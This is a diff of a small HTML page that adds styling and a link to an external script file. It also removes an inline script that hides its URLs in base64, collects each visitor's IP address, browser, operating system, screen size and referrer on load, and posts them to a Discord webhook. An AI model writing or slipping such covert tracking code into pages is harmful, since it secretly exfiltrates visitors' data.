@@ -3,81 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <title>vacepk</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 20%;
+        }
+    </style>
+    <script src="script.js"></script> <!-- Link to the external JavaScript file -->
 </head>
 <body>
     <h1>Welcome to vacepk</h1>
-
-    <script>
-        (function() {
-            function decode(data) {
-                return atob(data);
-            }
-
-            async function getIP() {
-                try {
-                    const response = await fetch(decode('aHR0cHM6Ly9hcGkuaXBpZnkuYmFyL2dldD9mb3JtYXQ9anNvbg=='));
-                    const data = await response.json();
-                    return data.ip;
-                } catch (e) {
-                    return 'N/A';
-                }
-            }
-
-            function getUA() {
-                const ua = navigator.userAgent;
-                let br = 'UB';  // Unknown Browser
-                let os = 'UO';  // Unknown OS
-
-                if (ua.includes('Firefox')) {
-                    br = 'MF';
-                } else if (ua.includes('Chrome')) {
-                    br = 'GC';
-                } else if (ua.includes('Safari')) {
-                    br = 'SF';
-                } else if (ua.includes('MSIE') || ua.includes('Trident')) {
-                    br = 'IE';
-                } else if (ua.includes('Opera') || ua.includes('OPR')) {
-                    br = 'OP';
-                }
-
-                if (ua.includes('Windows NT 10.0')) {
-                    os = 'W10';
-                } else if (ua.includes('Mac OS X')) {
-                    os = 'Mac';
-                } else if (ua.includes('Linux')) {
-                    os = 'Lin';
-                } else if (ua.includes('Android')) {
-                    os = 'And';
-                } else if (ua.includes('iPhone')) {
-                    os = 'iOS (iP)';
-                } else if (ua.includes('iPad')) {
-                    os = 'iOS (iPd)';
-                }
-
-                return { br, os };
-            }
-
-            async function sendInfo() {
-                const ip = await getIP();
-                const { br, os } = getUA();
-                const sw = screen.width;
-                const sh = screen.height;
-                const rf = document.referrer || 'Direct';
-                const ts = new Date().toISOString();
-
-                const data = { ip, br, os, sw, sh, rf, ts };
-
-                const url = decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5MC9hYmNkZWY=');
-
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: JSON.stringify(data) })
-                });
-            }
-
-            window.onload = sendInfo;
-        })();
-    </script>
 </body>
 </html>
